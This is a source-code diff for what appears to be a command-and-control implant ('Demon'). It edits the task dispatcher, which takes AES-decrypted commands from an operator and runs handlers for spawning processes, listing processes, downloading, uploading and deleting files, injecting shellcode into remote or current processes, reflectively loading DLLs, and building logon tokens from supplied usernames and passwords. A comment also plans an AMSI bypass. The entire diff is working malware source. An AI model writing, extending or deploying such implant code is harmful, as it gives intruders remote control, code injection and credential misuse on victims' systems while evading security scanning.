@@ -12,9 +12,8 @@
 #include <Loader/CoffeeLdr.h>
 #include <Inject/Inject.h>
 
+// TODO: change AMSI patch to hardware breakpoint on AmsiScanBuffer
 BOOL AmsiPatched = FALSE;
-
-#define DEMON_COMMAND_SIZE  ( sizeof( DemonCommands ) / sizeof ( DemonCommands[ 0 ] ) )
 
 DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_SLEEP,                    .Function = CommandSleep                    },
@@ -22,7 +21,6 @@ DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_JOB,                      .Function = CommandJob                      },
         { .ID = DEMON_COMMAND_PROC,                     .Function = CommandProc                     },
         { .ID = DEMON_COMMAND_PROC_LIST,                .Function = CommandProcList                 },
-        { .ID = DEMON_COMMAND_PROC_KILL,                .Function = CommandProcKill                 },
         { .ID = DEMON_COMMAND_FS,                       .Function = CommandFS                       },
         { .ID = DEMON_COMMAND_INLINE_EXECUTE,           .Function = CommandInlineExecute            },
         { .ID = DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE,  .Function = CommandAssemblyInlineExecute    },
@@ -36,6 +34,9 @@ DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_SPAWN_DLL,                .Function = CommandSpawnDLL                 },
         { .ID = DEMON_COMMAND_TOKEN,                    .Function = CommandToken                    },
         { .ID = DEMON_EXIT,                             .Function = CommandExit                     },
+
+        // End
+        { .ID = NULL, .Function = NULL }
 };
 
 VOID CommandDispatcher( VOID )
@@ -48,8 +49,6 @@ VOID CommandDispatcher( VOID )
     LPVOID   TaskBuffer     = NULL;
     UINT32   TaskBufferSize = 0;
     UINT32   CommandID      = 0;
-    BOOL     PackageFirst   = TRUE;
-    BOOL     FoundCommand   = FALSE;
 
     PRINTF( "Session ID => %x\n", Instance->Session.DemonID );
 
@@ -80,26 +79,19 @@ VOID CommandDispatcher( VOID )
                     {
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                         ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
-
-                        if ( ! PackageFirst )
-                            ParserGetInt32( &TaskParser );
-                        else
-                            PackageFirst = FALSE;
                     }
 
-                    FoundCommand = FALSE;
-                    for ( UINT32 FunctionCounter = 0; FunctionCounter < DEMON_COMMAND_SIZE; FunctionCounter++ )
+                    for ( UINT32 FunctionCounter = 0 ;; FunctionCounter++ )
                     {
+                        if ( DemonCommands[ FunctionCounter ].Function == NULL )
+                            break;
+
                         if ( DemonCommands[ FunctionCounter ].ID == CommandID )
                         {
                             DemonCommands[ FunctionCounter ].Function( &TaskParser );
-                            FoundCommand = TRUE;
                             break;
                         }
                     }
-
-                    if ( ! FoundCommand )
-                        PUTS( "Command not found !!" )
                 }
 
             } while ( Parser.Length > 4 );
@@ -119,9 +111,12 @@ VOID CommandDispatcher( VOID )
 #endif
         }
 
+        /* === End routine checks === */
         // Check if we have something in our Pivots connection and sends back the output from the pipes
         PivotCollectOutput();
-        PackageFirst = TRUE;
+        // Check if there is something that a process output is available or check if the jobs are still alive.
+        JobCheckList();
+
     } while ( TRUE );
 
     Instance->Session.Connected = FALSE;
@@ -175,7 +170,7 @@ VOID CommandJob( PPARSER Parser )
             do {
                 if ( JobList )
                 {
-                    PRINTF( "Job => JobID:[%d] Type:[%d] State:[%d]", JobList->JobID, JobList->Type, JobList->State )
+                    PRINTF( "Job => JobID:[%d] Type:[%d] State:[%d]\n", JobList->JobID, JobList->Type, JobList->State )
 
                     PackageAddInt32( Package, JobList->JobID );
                     PackageAddInt32( Package, JobList->Type );
@@ -426,18 +421,10 @@ VOID CommandProc( PPARSER DataArgs )
                 if ( ProcessVerbose )
                     PackageAddInt32( Package, ProcessInfo.dwProcessId );
 
+                // Instance->Win32.NtClose( ProcessInfo.hThread );
+
                 PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
             }
-
-            break;
-        }
-
-        case 5: PUTS( "Proc::BlockDll" )
-        {
-            UINT32 BlockOnOrOff = ParserGetInt32( DataArgs );
-
-            Instance->Config.Process.BlockDll = ( BOOL ) BlockOnOrOff;
-            PackageAddInt32( Package, BlockOnOrOff );
 
             break;
         }
@@ -550,15 +537,14 @@ VOID CommandProcList( PPARSER Parser )
             ListSize               += Required;
             ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
 
-	    if ( ProcessInformationList != NULL )
-	    {
-        	NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
-            }
+            if ( ProcessInformationList != NULL )
+                NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
             else
             {
-        	PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-            	goto LEAVE;
-       	    }
+                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                goto LEAVE;
+            }
+
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "NtQuerySystemInformation: Failed" )
@@ -566,23 +552,23 @@ VOID CommandProcList( PPARSER Parser )
                 goto LEAVE;
             }
         }
-        if ( NtStatus == STATUS_INFO_LENGTH_MISMATCH ){
-        	
+
+        if ( NtStatus == STATUS_INFO_LENGTH_MISMATCH )
+        {
         	do
         	{
-		    Instance->Win32.LocalFree( ProcessInformationList );
+                Instance->Win32.LocalFree( ProcessInformationList );
 
-		    ListSize               += Required;
-		    ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
-		    if ( ProcessInformationList != NULL )
-		    {
-        	    	NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
-        	    }
-        	    else
-        	    {
-        	        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-            		goto LEAVE;
-        	    }
+                ListSize               += Required;
+                ProcessInformationList =  Instance->Win32.LocalAlloc( LPTR, ListSize );
+
+                if ( ProcessInformationList != NULL )
+                    NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, ProcessInformationList, ListSize, &Required);
+                else
+                {
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                    goto LEAVE;
+                }
         	}
         	while ( NtStatus == STATUS_INFO_LENGTH_MISMATCH );
         }
@@ -604,9 +590,9 @@ VOID CommandProcList( PPARSER Parser )
         CLIENT_ID         ClientID    = { ProcessID, 0 };
         OBJECT_ATTRIBUTES ObjAttr     = { sizeof( OBJECT_ATTRIBUTES ) };
 
-        Instance->Syscall.NtOpenProcess( &hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID );
-        Instance->Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken );
+        hProcess = ProcessOpen( ProcessID, ( Instance->Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
 
+        Instance->Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken );
         ProcessUser = TokenGetUserDomain( hToken, &UserSize );
 
         PackageAddBytes( Package, ProcessInformationList->ImageName.Buffer, ProcessInformationList->ImageName.Length );
@@ -621,7 +607,8 @@ VOID CommandProcList( PPARSER Parser )
         if ( ProcessID != Instance->Session.PID )
             Instance->Win32.NtClose( hProcess );
 #else
-        Instance->Win32.NtClose( hProcess );
+        if ( hProcess  )
+            Instance->Win32.NtClose( hProcess );
 #endif
 
         if ( hToken )
@@ -646,12 +633,6 @@ VOID CommandProcList( PPARSER Parser )
 
 LEAVE:
     PackageDestroy( Package );
-}
-
-// TODO: move this to the Proc Function Module
-VOID CommandProcKill( PPARSER DataArgs )
-{
-
 }
 
 VOID CommandFS( PPARSER DataArgs )
@@ -698,7 +679,7 @@ VOID CommandFS( PPARSER DataArgs )
             }
             else
             {
-                PackageAddBytes( Package, Path, PathSize * 2 );
+                PackageAddBytes( Package, Path, PathSize );
             }
 
             MemSet( &FindData, 0, sizeof( FindData ) );
@@ -750,7 +731,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 2:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::Download" )
 
             DWORD  FileSize = 0;
@@ -804,22 +784,18 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 3:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::Upload" )
 
             DWORD  FileSize = 0;
             DWORD  NameSize = 0;
             DWORD  Written  = 0;
+            HANDLE hFile    = NULL;
             LPWSTR FileName = ParserGetBytes( DataArgs, &NameSize );
             PVOID  Content  = ParserGetBytes( DataArgs, &FileSize );
-            HANDLE hFile    = NULL;
 
-            FileName[ NameSize ] = 0;
-
-            PRINTF( "FileName => %s (FileSize: %d)", FileName, FileSize )
+            PRINTF( "FileName[%d] => %ls\n", FileSize, FileName )
 
             hFile = Instance->Win32.CreateFileW( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
-
             if ( hFile == INVALID_HANDLE_VALUE )
             {
                 PUTS( "CreateFileW: Failed" )
@@ -846,7 +822,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 4:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::Cd" )
             DWORD  PathSize = 0;
             LPWSTR Path     = ParserGetBytes( DataArgs, &PathSize );
@@ -866,7 +841,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 5:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::Remove" )
             DWORD  PathSize = 0;
             LPWSTR Path     = ParserGetBytes( DataArgs, &PathSize );
@@ -903,7 +877,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 6:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::Mkdir" )
             DWORD  PathSize = 0;
             LPWSTR Path     = ParserGetBytes( DataArgs, &PathSize );
@@ -921,7 +894,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 7: PUTS( "FS::Copy" )
         {
-            // TODO: update UNICODE string
             DWORD  FromSize = 0;
             DWORD  ToSize   = 0;
             LPWSTR PathFrom = NULL;
@@ -949,7 +921,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 9:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::GetPwd" )
             WCHAR Path[ MAX_PATH * 2 ] = { 0 };
             DWORD Return               = 0;
@@ -1134,6 +1105,23 @@ VOID CommandInjectDLL( PPARSER DataArgs )
     PackageTransmit( Package, NULL, NULL );
 }
 
+VOID CommandSpawnDLL( PPARSER DataArgs )
+{
+    PPACKAGE      Package   = NULL;
+    INJECTION_CTX InjCtx    = { 0 };
+    DWORD         DllSize   = 0;
+    DWORD         ArgSize   = 0;
+    PCHAR         DllBytes  = ParserGetBytes( DataArgs, &DllSize );
+    PCHAR         Arguments = ParserGetBytes( DataArgs, &ArgSize );
+    DWORD         Result    = 0;
+
+    Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
+    Result  = DllSpawnReflective( DllBytes, DllSize, Arguments, ArgSize, &InjCtx );
+
+    PackageAddInt32( Package, Result );
+    PackageTransmit( Package, NULL, NULL );
+}
+
 VOID CommandInjectShellcode( PPARSER DataArgs )
 {
     PPACKAGE      Package        = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
@@ -1158,7 +1146,7 @@ VOID CommandInjectShellcode( PPARSER DataArgs )
 
     PRINTF( "Inject[%s] Technique[%d] TargetPID:[%d] TargetProcessArch:[%d] ShellcodeSize:[%d]\n", Inject ? "TRUE" : "FALSE", Technique, TargetPID, TargetArch, ShellcodeSize );
 
-    if ( Inject )
+    if ( Inject == 1 )
     {
         // Inject into running process
         CLIENT_ID         ClientID = { TargetPID, 0 };
@@ -1173,9 +1161,10 @@ VOID CommandInjectShellcode( PPARSER DataArgs )
             return;
         }
     }
-    else
+    else if ( Inject == 2 )
     {
-        // Spawn & Inject
+        // Execute
+        InjectionCtx.hProcess = NtCurrentProcess();
     }
 
     Technique = Technique == 0 ? Instance->Config.Inject.Technique : Technique; // if the teamserver specified 0 ==> means that it should use the technique from the config
@@ -1193,25 +1182,6 @@ VOID CommandInjectShellcode( PPARSER DataArgs )
     PRINTF( "Injection Result => %d", Result )
 
     PackageAddInt32( Package, Result );
-    PackageTransmit( Package, NULL, NULL );
-}
-
-VOID CommandSpawnDLL( PPARSER DataArgs )
-{
-    PPACKAGE      Package   = NULL;
-    INJECTION_CTX InjCtx    = { 0 };
-    DWORD         DllSize   = 0;
-    DWORD         ArgSize   = 0;
-    PCHAR         DllBytes  = ParserGetBytes( DataArgs, &DllSize );
-    PCHAR         Arguments = ParserGetBytes( DataArgs, &ArgSize );
-
-    Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
-
-    if ( DllSpawnReflective( DllBytes, DllSize, Arguments, ArgSize, &InjCtx ) )
-        PackageAddInt32( Package, TRUE );
-    else
-        PackageAddInt32( Package, FALSE );
-
     PackageTransmit( Package, NULL, NULL );
 }
 
@@ -1335,7 +1305,6 @@ VOID CommandToken( PPARSER Parser )
             DWORD             Length      = 0;
             HANDLE            TokenHandle = NULL;
             BOOL              ListPrivs   = ParserGetInt32( Parser );
-            DWORD             UserSize    = 0;
 
             PackageAddInt32( Package, ListPrivs );
 
@@ -1368,9 +1337,12 @@ VOID CommandToken( PPARSER Parser )
                 PUTS( "Privs::Get" )
             }
 
-            MemSet( TokenPrivs, 0, sizeof( TOKEN_PRIVILEGES ) );
-            Instance->Win32.LocalFree( TokenPrivs );
-            TokenPrivs = NULL;
+            if ( TokenPrivs )
+            {
+                MemSet( TokenPrivs, 0, sizeof( TOKEN_PRIVILEGES ) );
+                Instance->Win32.LocalFree( TokenPrivs );
+                TokenPrivs = NULL;
+            }
 
             break;
         }
@@ -1387,7 +1359,6 @@ VOID CommandToken( PPARSER Parser )
             UCHAR  Deli[ 2 ]      = { '\\', 0 };
             HANDLE hToken         = NULL;
             PCHAR  UserDomain     = NULL;
-            DWORD  Type           = NULL;
             LPSTR  BufferUser     = NULL;
             LPSTR  BufferPassword = NULL;
             LPSTR  BufferDomain   = NULL;
@@ -1418,9 +1389,17 @@ VOID CommandToken( PPARSER Parser )
 
                     MemCopy( BufferUser, lpUser, dwUserSize );
                     MemCopy( BufferPassword, lpPassword, dwPasswordSize );
-                    MemCopy( BufferDomain,lpDomain, dwDomainSize );
+                    MemCopy( BufferDomain, lpDomain, dwDomainSize );
 
-                    TokenAdd( hToken, UserDomain, TOKEN_TYPE_MAKE_NETWORK, NtCurrentTEB()->ClientId.UniqueProcess, BufferUser, BufferDomain, BufferPassword );
+                    TokenAdd(
+                        hToken,
+                        UserDomain,
+                        TOKEN_TYPE_MAKE_NETWORK,
+                        NtCurrentTEB()->ClientId.UniqueProcess,
+                        BufferUser,
+                        BufferDomain,
+                        BufferPassword
+                    );
 
                     PRINTF( "UserDomain => %s\n", UserDomain )
 
